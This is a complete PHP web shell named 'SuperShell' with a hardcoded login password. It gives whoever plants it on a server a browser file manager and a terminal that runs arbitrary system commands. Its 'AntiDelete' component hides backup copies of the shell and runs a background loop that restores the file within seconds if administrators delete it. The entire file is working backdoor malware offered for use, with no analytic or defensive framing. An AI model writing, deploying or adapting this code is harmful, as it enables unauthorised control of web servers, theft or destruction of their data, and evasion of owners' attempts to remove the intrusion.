<?php

define('SHELL_PASS', 'skuy');
define('SHELL_PATH', __FILE__);
define('SHELL_DIR', __DIR__);

class AntiDelete {
    private $locked = false;
    private $backup_file = '';
    
    public function __construct() {
        $this->backup_file = sys_get_temp_dir() . '/.' . md5('shell_backup') . '.php';
        $this->checkLockStatus();
        
        if (isset($_GET['monitor'])) {
            $this->startMonitor();
        }
    }
    
    private function checkLockStatus() {
        if (isset($_SESSION['shell_locked']) && $_SESSION['shell_locked'] === true) {
            $this->locked = true;
            return;
        }
        
        $lock_file = sys_get_temp_dir() . '/.' . md5('lock_status') . '.txt';
        if (file_exists($lock_file) && file_get_contents($lock_file) === 'LOCKED') {
            $this->locked = true;
            $_SESSION['shell_locked'] = true;
        }
    }
    
    public function isLocked() {
        return $this->locked;
    }
    
    public function setLock($status) {
        $this->locked = $status;
        $_SESSION['shell_locked'] = $status;
        
        $lock_file = sys_get_temp_dir() . '/.' . md5('lock_status') . '.txt';
        if ($status) {
            file_put_contents($lock_file, 'LOCKED');
            $this->createBackup();
            $this->startBackgroundMonitor();
        } else {
            @unlink($lock_file);
        }
    }
    
    private function createBackup() {
        $content = file_get_contents(SHELL_PATH);
        file_put_contents($this->backup_file, $content);
        
        $backup2 = SHELL_DIR . '/.' . md5('hidden_backup') . '.php';
        file_put_contents($backup2, $content);
    }
    
    private function startBackgroundMonitor() {
        $url = (isset($_SERVER['HTTPS']) ? 'https://' : 'http://') . 
               $_SERVER['HTTP_HOST'] . $_SERVER['PHP_SELF'] . '?monitor=1';
        
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_TIMEOUT, 1);
        curl_setopt($ch, CURLOPT_FRESH_CONNECT, true);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        curl_exec($ch);
        curl_close($ch);
    }
    
    private function startMonitor() {
        ignore_user_abort(true);
        set_time_limit(0);
        
        while ($this->locked) {
            if (!file_exists(SHELL_PATH)) {
                $this->restoreFromBackup();
            }
            sleep(5);
            $this->checkLockStatus();
        }
        exit;
    }
    
    private function restoreFromBackup() {
        if (file_exists($this->backup_file)) {
            copy($this->backup_file, SHELL_PATH);
        } else {
            $backup2 = SHELL_DIR . '/.' . md5('hidden_backup') . '.php';
            if (file_exists($backup2)) {
                copy($backup2, SHELL_PATH);
            }
        }
    }
}

class FileManager {
    private $current_dir;
    
    public function __construct() {
        $this->current_dir = getcwd();
    }
    
    public function listDir($path = '') {
        if ($path && is_dir($path)) {
            $this->current_dir = $path;
        }
        
        $files = scandir($this->current_dir);
        $result = [];
        
        foreach ($files as $file) {
            if ($file == '.' || $file == '..') continue;
            
            $fullpath = $this->current_dir . '/' . $file;
            $stat = stat($fullpath);
            
            $result[] = [
                'name' => $file,
                'path' => $fullpath,
                'size' => $stat['size'],
                'size_hr' => $this->formatBytes($stat['size']),
                'perms' => substr(sprintf('%o', fileperms($fullpath)), -4),
                'modified' => date('Y-m-d H:i:s', $stat['mtime']),
                'is_dir' => is_dir($fullpath)
            ];
        }
        
        return [
            'current' => $this->current_dir,
            'parent' => dirname($this->current_dir),
            'files' => $result
        ];
    }
    
    public function uploadFile($file, $target_dir = null) {
        $target_dir = $target_dir ?: $this->current_dir;
        
        if ($file['size'] == 0) {
            return ['error' => 'File kosong'];
        }
        
        $target = $target_dir . '/' . $file['name'];
        
        if (move_uploaded_file($file['tmp_name'], $target)) {
            return ['success' => true, 'path' => $target];
        }
        
        return ['error' => 'Upload gagal'];
    }
    
    public function deleteFile($path) {
        if (is_dir($path)) {
            $files = array_diff(scandir($path), ['.', '..']);
            foreach ($files as $file) {
                $this->deleteFile($path . '/' . $file);
            }
            return rmdir($path);
        } else {
            return unlink($path);
        }
    }
    
    public function editFile($path, $content = null) {
        if ($content !== null) {
            return file_put_contents($path, $content) !== false;
        } else {
            return file_get_contents($path);
        }
    }
    
    public function createFile($path, $content = '') {
        return file_put_contents($path, $content) !== false;
    }
    
    public function createDir($path) {
        return mkdir($path, 0755, true);
    }
    
    private function formatBytes($bytes) {
        $sizes = ['B', 'KB', 'MB', 'GB'];
        $i = 0;
        while ($bytes >= 1024 && $i < count($sizes) - 1) {
            $bytes /= 1024;
            $i++;
        }
        return round($bytes, 2) . ' ' . $sizes[$i];
    }
}

class Terminal {
    public function execute($cmd) {
        $output = '';
        $return = -1;
        
        if (function_exists('shell_exec')) {
            $output = shell_exec($cmd . ' 2>&1');
            $return = 0;
        } elseif (function_exists('exec')) {
            exec($cmd . ' 2>&1', $out, $return);
            $output = implode("\n", $out);
        } elseif (function_exists('system')) {
            ob_start();
            system($cmd . ' 2>&1', $return);
            $output = ob_get_clean();
        } else {
            $output = 'Command execution not available';
        }
        
        return [
            'output' => $output,
            'code' => $return
        ];
    }
}

session_start();
$anti_delete = new AntiDelete();
$file_manager = new FileManager();
$terminal = new Terminal();

if (isset($_GET['logout'])) {
    session_destroy();
    header('Location: ' . $_SERVER['PHP_SELF']);
    exit;
}

if (!isset($_SESSION['logged_in'])) {
    if (isset($_POST['pass']) && $_POST['pass'] === SHELL_PASS) {
        $_SESSION['logged_in'] = true;
    } else {
        ?>
        <!DOCTYPE html>
        <html>
        <head>
            <title>SuperShell</title>
            <style>
                body { background: #1a1a2e; font-family: Arial; display: flex; justify-content: center; align-items: center; height: 100vh; }
                .login { background: #16213e; padding: 40px; border-radius: 10px; width: 300px; }
                h2 { color: #e94560; text-align: center; }
                input { width: 100%; padding: 10px; margin: 10px 0; background: #1a1a2e; border: 1px solid #0f3460; color: white; }
                button { width: 100%; padding: 10px; background: #e94560; color: white; border: none; cursor: pointer; }
                .status { text-align: center; color: <?php echo $anti_delete->isLocked() ? '#e94560' : '#0db8de'; ?>; margin-bottom: 20px; }
            </style>
        </head>
        <body>
            <div class="login">
                <h2>SuperShell</h2>
                <div class="status"><?php echo $anti_delete->isLocked() ? '🔒 LOCKED' : '🔓 UNLOCKED'; ?></div>
                <form method="POST">
                    <input type="password" name="pass" placeholder="Password" autofocus>
                    <button type="submit">Login</button>
                </form>
            </div>
        </body>
        </html>
        <?php
        exit;
    }
}

// Handle actions
$action = $_POST['action'] ?? $_GET['action'] ?? '';
$response = ['status' => 'error', 'message' => 'Unknown action'];

if ($action) {
    switch($action) {
        case 'toggle_lock':
            $anti_delete->setLock(!$anti_delete->isLocked());
            $response = ['status' => 'success', 'locked' => $anti_delete->isLocked()];
            break;
            
        case 'list_dir':
            $path = $_POST['path'] ?? '';
            $response = ['status' => 'success', 'data' => $file_manager->listDir($path)];
            break;
            
        case 'upload':
            if (isset($_FILES['file'])) {
                $target = $_POST['target'] ?? '';
                $response = ['status' => 'success', 'data' => $file_manager->uploadFile($_FILES['file'], $target)];
            }
            break;
            
        case 'delete':
            $path = $_POST['path'] ?? '';
            $response = ['status' => 'success', 'data' => $file_manager->deleteFile($path)];
            break;
            
        case 'edit':
            $path = $_POST['path'] ?? '';
            $content = $_POST['content'] ?? null;
            if ($content !== null) {
                $response = ['status' => 'success', 'data' => $file_manager->editFile($path, $content)];
            } else {
                $response = ['status' => 'success', 'data' => $file_manager->editFile($path)];
            }
            break;
            
        case 'create_file':
            $path = $_POST['path'] ?? '';
            $content = $_POST['content'] ?? '';
            $response = ['status' => 'success', 'data' => $file_manager->createFile($path, $content)];
            break;
            
        case 'create_dir':
            $path = $_POST['path'] ?? '';
            $response = ['status' => 'success', 'data' => $file_manager->createDir($path)];
            break;
            
        case 'execute':
            $cmd = $_POST['cmd'] ?? '';
            $response = ['status' => 'success', 'data' => $terminal->execute($cmd)];
            break;
    }
    
    if (!empty($_SERVER['HTTP_X_REQUESTED_WITH'])) {
        header('Content-Type: application/json');
        echo json_encode($response);
        exit;
    }
}

?>
<!DOCTYPE html>
<html>
<head>
    <title>SuperShell</title>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            background: #0a0c1a;
            color: #e0e0e0;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
        }
        .navbar {
            background: #12142a;
            padding: 15px 30px;
            display: flex;
            justify-content: space-between;
            align-items: center;
            border-bottom: 3px solid #e94560;
        }
        .logo {
            font-size: 24px;
            font-weight: bold;
            color: #e94560;
        }
        .nav-buttons {
            display: flex;
            gap: 15px;
        }
        .lock-btn {
            background: <?php echo $anti_delete->isLocked() ? '#e94560' : '#2a2f4f'; ?>;
            color: white;
            border: none;
            padding: 10px 25px;
            border-radius: 50px;
            cursor: pointer;
            font-weight: bold;
        }
        .logout-btn {
            background: #2a2f4f;
            color: white;
            border: none;
            padding: 10px 25px;
            border-radius: 50px;
            cursor: pointer;
            text-decoration: none;
        }
        .container {
            display: grid;
            grid-template-columns: 200px 1fr;
            gap: 20px;
            padding: 20px;
            height: calc(100vh - 80px);
        }
        .sidebar {
            background: #12142a;
            border-radius: 10px;
            padding: 15px;
        }
        .sidebar-item {
            padding: 12px;
            margin: 5px 0;
            background: #1a1d3a;
            border-radius: 8px;
            cursor: pointer;
        }
        .sidebar-item:hover, .sidebar-item.active {
            background: #e94560;
        }
        .main-content {
            background: #12142a;
            border-radius: 10px;
            padding: 20px;
            overflow-y: auto;
        }
        .toolbar {
            display: flex;
            gap: 10px;
            margin-bottom: 20px;
            flex-wrap: wrap;
        }
        .btn {
            background: #1a1d3a;
            color: white;
            border: none;
            padding: 8px 15px;
            border-radius: 5px;
            cursor: pointer;
        }
        .btn-primary {
            background: #e94560;
        }
        .btn-success {
            background: #0db8de;
        }
        .file-list {
            width: 100%;
            border-collapse: collapse;
        }
        .file-list th {
            text-align: left;
            padding: 10px;
            background: #1a1d3a;
            color: #0db8de;
        }
        .file-list td {
            padding: 8px 10px;
            border-bottom: 1px solid #2a2f4f;
        }
        .file-list tr:hover {
            background: #1a1d3a;
        }
        .terminal {
            background: #0a0c1a;
            padding: 15px;
            border-radius: 5px;
            font-family: monospace;
            height: 400px;
            overflow-y: auto;
        }
        .terminal-input {
            display: flex;
            gap: 10px;
            margin-top: 10px;
        }
        .terminal-input input {
            flex: 1;
            background: #1a1d3a;
            border: 1px solid #2a2f4f;
            color: white;
            padding: 8px;
            border-radius: 5px;
        }
        .breadcrumb {
            background: #1a1d3a;
            padding: 10px;
            border-radius: 5px;
            margin-bottom: 15px;
        }
        .breadcrumb a {
            color: #0db8de;
            text-decoration: none;
            margin: 0 5px;
        }
        .modal {
            display: none;
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0,0,0,0.8);
            z-index: 1000;
            justify-content: center;
            align-items: center;
        }
        .modal.active {
            display: flex;
        }
        .modal-content {
            background: #12142a;
            padding: 30px;
            border-radius: 10px;
            width: 500px;
            border: 2px solid #e94560;
        }
        .modal-content input, .modal-content textarea {
            width: 100%;
            padding: 8px;
            margin: 10px 0;
            background: #1a1d3a;
            border: 1px solid #2a2f4f;
            color: white;
        }
        .modal-buttons {
            display: flex;
            gap: 10px;
            margin-top: 20px;
        }
        .tab-content {
            display: none;
        }
        .tab-content.active {
            display: block;
        }
    </style>
</head>
<body>
    <div class="navbar">
        <div class="logo">SuperShell</div>
        <div class="nav-buttons">
            <button class="lock-btn" onclick="toggleLock()">
                <?php echo $anti_delete->isLocked() ? '🔒 UNLOCK' : '🔓 LOCK'; ?>
            </button>
            <a href="?logout=1" class="logout-btn">Logout</a>
        </div>
    </div>
    
    <div class="container">
        <div class="sidebar">
            <div class="sidebar-item active" onclick="switchTab('filemanager')">📁 File Manager</div>
            <div class="sidebar-item" onclick="switchTab('terminal')">💻 Terminal</div>
            <div class="sidebar-item" onclick="switchTab('info')">ℹ️ Info</div>
        </div>
        
        <div class="main-content">
            <!-- File Manager -->
            <div id="filemanager-tab" class="tab-content active">
                <div class="toolbar">
                    <button class="btn btn-primary" onclick="uploadFile()">Upload</button>
                    <button class="btn" onclick="createFile()">New File</button>
                    <button class="btn" onclick="createFolder()">New Folder</button>
                    <button class="btn" onclick="refresh()">Refresh</button>
                    <button class="btn btn-success" onclick="goHome()">Home</button>
                </div>
                
                <div class="breadcrumb" id="currentPath">Loading...</div>
                
                <table class="file-list" id="fileList">
                    <thead>
                        <tr><th>Type</th><th>Name</th><th>Size</th><th>Perms</th><th>Modified</th><th>Actions</th></tr>
                    </thead>
                    <tbody id="fileListBody">
                        <tr><td colspan="6">Loading...</td></tr>
                    </tbody>
                </table>
            </div>
            
            <!-- Terminal -->
            <div id="terminal-tab" class="tab-content">
                <div class="terminal" id="terminalOutput">
                    <div>SuperShell Terminal</div>
                    <div>━━━━━━━━━━━━━━━━━━━━</div>
                </div>
                <div class="terminal-input">
                    <span style="color:#e94560">$</span>
                    <input type="text" id="terminalCmd" placeholder="Enter command" onkeypress="if(event.keyCode==13) runCommand()">
                    <button class="btn btn-primary" onclick="runCommand()">Run</button>
                </div>
            </div>
            
            <!-- Info -->
            <div id="info-tab" class="tab-content">
                <h2>System Info</h2>
                <pre><?php
                    echo "OS: " . php_uname() . "\n";
                    echo "PHP: " . phpversion() . "\n";
                    echo "Server: " . ($_SERVER['SERVER_SOFTWARE'] ?? 'Unknown') . "\n";
                    echo "User: " . (function_exists('get_current_user') ? get_current_user() : 'Unknown') . "\n";
                    echo "Dir: " . getcwd() . "\n";
                ?></pre>
            </div>
        </div>
    </div>
    
    <!-- Upload Modal -->
    <div id="uploadModal" class="modal">
        <div class="modal-content">
            <h3>Upload File</h3>
            <input type="file" id="fileInput">
            <div class="modal-buttons">
                <button class="btn btn-primary" onclick="uploadSubmit()">Upload</button>
                <button class="btn" onclick="closeModal('uploadModal')">Cancel</button>
            </div>
        </div>
    </div>
    
    <!-- Edit Modal -->
    <div id="editModal" class="modal">
        <div class="modal-content" style="width:800px;">
            <h3>Edit File</h3>
            <textarea id="editContent" style="height:400px;"></textarea>
            <div class="modal-buttons">
                <button class="btn btn-primary" onclick="saveEdit()">Save</button>
                <button class="btn" onclick="closeModal('editModal')">Cancel</button>
            </div>
        </div>
    </div>
    
    <!-- Create File Modal -->
    <div id="createModal" class="modal">
        <div class="modal-content">
            <h3>Create File</h3>
            <input type="text" id="createName" placeholder="Filename">
            <textarea id="createContent" placeholder="Content" style="height:150px;"></textarea>
            <div class="modal-buttons">
                <button class="btn btn-primary" onclick="createSubmit()">Create</button>
                <button class="btn" onclick="closeModal('createModal')">Cancel</button>
            </div>
        </div>
    </div>
    
    <!-- Create Folder Modal -->
    <div id="folderModal" class="modal">
        <div class="modal-content">
            <h3>Create Folder</h3>
            <input type="text" id="folderName" placeholder="Folder name">
            <div class="modal-buttons">
                <button class="btn btn-primary" onclick="createFolderSubmit()">Create</button>
                <button class="btn" onclick="closeModal('folderModal')">Cancel</button>
            </div>
        </div>
    </div>
    
    <script>
        let currentDir = '';
        let editPath = '';
        
        function toggleLock() {
            fetch('', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/x-www-form-urlencoded',
                    'X-Requested-With': 'XMLHttpRequest'
                },
                body: 'action=toggle_lock'
            })
            .then(res => res.json())
            .then(data => {
                location.reload();
            });
        }
        
        function switchTab(tab) {
            document.querySelectorAll('.tab-content').forEach(el => el.style.display = 'none');
            document.getElementById(tab + '-tab').style.display = 'block';
            
            document.querySelectorAll('.sidebar-item').forEach(el => el.classList.remove('active'));
            event.target.classList.add('active');
            
            if (tab === 'filemanager') loadFileList();
        }
        
        function loadFileList(path = '') {
            currentDir = path;
            
            let formData = new FormData();
            formData.append('action', 'list_dir');
            formData.append('path', path);
            
            fetch('', {
                method: 'POST',
                body: formData,
                headers: {
                    'X-Requested-With': 'XMLHttpRequest'
                }
            })
            .then(res => res.json())
            .then(data => {
                if (data.status === 'success') {
                    renderFileList(data.data);
                }
            });
        }
        
        function renderFileList(data) {
            let html = '';
            
            let pathHtml = '<a href="#" onclick="loadFileList(\'\')">root</a>';
            if (data.current) {
                let parts = data.current.split('/').filter(p => p);
                let current = '';
                parts.forEach(part => {
                    current += '/' + part;
                    pathHtml += ' / <a href="#" onclick="loadFileList(\'' + current + '\')">' + part + '</a>';
                });
            }
            document.getElementById('currentPath').innerHTML = pathHtml;
            
            data.files.forEach(file => {
                html += '<tr>';
                html += '<td>' + (file.is_dir ? '📁' : '📄') + '</td>';
                html += '<td>';
                if (file.is_dir) {
                    html += '<a href="#" onclick="loadFileList(\'' + file.path + '\')">' + file.name + '</a>';
                } else {
                    html += file.name;
                }
                html += '</td>';
                html += '<td>' + file.size_hr + '</td>';
                html += '<td>' + file.perms + '</td>';
                html += '<td>' + file.modified + '</td>';
                html += '<td>';
                if (!file.is_dir) {
                    html += '<button class="btn" onclick="editFile(\'' + file.path + '\')">✏️</button> ';
                    html += '<button class="btn" onclick="downloadFile(\'' + file.path + '\')">⬇️</button> ';
                }
                html += '<button class="btn btn-primary" onclick="deleteFile(\'' + file.path + '\')">🗑️</button>';
                html += '</td>';
                html += '</tr>';
            });
            
            document.getElementById('fileListBody').innerHTML = html;
        }
        
        function uploadFile() {
            document.getElementById('uploadModal').classList.add('active');
        }
        
        function uploadSubmit() {
            let file = document.getElementById('fileInput').files[0];
            if (!file) return;
            
            let formData = new FormData();
            formData.append('action', 'upload');
            formData.append('file', file);
            formData.append('target', currentDir);
            
            fetch('', {
                method: 'POST',
                body: formData,
                headers: {
                    'X-Requested-With': 'XMLHttpRequest'
                }
            })
            .then(res => res.json())
            .then(() => {
                closeModal('uploadModal');
                loadFileList(currentDir);
            });
        }
        
        function editFile(path) {
            editPath = path;
            
            let formData = new FormData();
            formData.append('action', 'edit');
            formData.append('path', path);
            
            fetch('', {
                method: 'POST',
                body: formData,
                headers: {
                    'X-Requested-With': 'XMLHttpRequest'
                }
            })
            .then(res => res.json())
            .then(data => {
                document.getElementById('editContent').value = data.data;
                document.getElementById('editModal').classList.add('active');
            });
        }
        
        function saveEdit() {
            let content = document.getElementById('editContent').value;
            
            let formData = new FormData();
            formData.append('action', 'edit');
            formData.append('path', editPath);
            formData.append('content', content);
            
            fetch('', {
                method: 'POST',
                body: formData,
                headers: {
                    'X-Requested-With': 'XMLHttpRequest'
                }
            })
            .then(res => res.json())
            .then(() => {
                closeModal('editModal');
                loadFileList(currentDir);
            });
        }
        
        function deleteFile(path) {
            if (confirm('Delete this file?')) {
                let formData = new FormData();
                formData.append('action', 'delete');
                formData.append('path', path);
                
                fetch('', {
                    method: 'POST',
                    body: formData,
                    headers: {
                        'X-Requested-With': 'XMLHttpRequest'
                    }
                })
                .then(() => loadFileList(currentDir));
            }
        }
        
        function downloadFile(path) {
            window.location.href = '?action=download&path=' + encodeURIComponent(path);
        }
        
        function createFile() {
            document.getElementById('createModal').classList.add('active');
        }
        
        function createSubmit() {
            let name = document.getElementById('createName').value;
            let content = document.getElementById('createContent').value;
            let path = currentDir ? currentDir + '/' + name : name;
            
            let formData = new FormData();
            formData.append('action', 'create_file');
            formData.append('path', path);
            formData.append('content', content);
            
            fetch('', {
                method: 'POST',
                body: formData,
                headers: {
                    'X-Requested-With': 'XMLHttpRequest'
                }
            })
            .then(res => res.json())
            .then(() => {
                closeModal('createModal');
                loadFileList(currentDir);
            });
        }
        
        function createFolder() {
            document.getElementById('folderModal').classList.add('active');
        }
        
        function createFolderSubmit() {
            let name = document.getElementById('folderName').value;
            let path = currentDir ? currentDir + '/' + name : name;
            
            let formData = new FormData();
            formData.append('action', 'create_dir');
            formData.append('path', path);
            
            fetch('', {
                method: 'POST',
                body: formData,
                headers: {
                    'X-Requested-With': 'XMLHttpRequest'
                }
            })
            .then(res => res.json())
            .then(() => {
                closeModal('folderModal');
                loadFileList(currentDir);
            });
        }
        
        function runCommand() {
            let cmd = document.getElementById('terminalCmd').value;
            if (!cmd) return;
            
            let terminal = document.getElementById('terminalOutput');
            terminal.innerHTML += '<div>$ ' + cmd + '</div>';
            
            let formData = new FormData();
            formData.append('action', 'execute');
            formData.append('cmd', cmd);
            
            fetch('', {
                method: 'POST',
                body: formData,
                headers: {
                    'X-Requested-With': 'XMLHttpRequest'
                }
            })
            .then(res => res.json())
            .then(data => {
                terminal.innerHTML += '<div>' + data.data.output + '</div>';
                terminal.scrollTop = terminal.scrollHeight;
                document.getElementById('terminalCmd').value = '';
            });
        }
        
        function refresh() {
            loadFileList(currentDir);
        }
        
        function goHome() {
            loadFileList('');
        }
        
        function closeModal(id) {
            document.getElementById(id).classList.remove('active');
        }
        
        loadFileList('');
    </script>
</body>
</html>
<?php
?>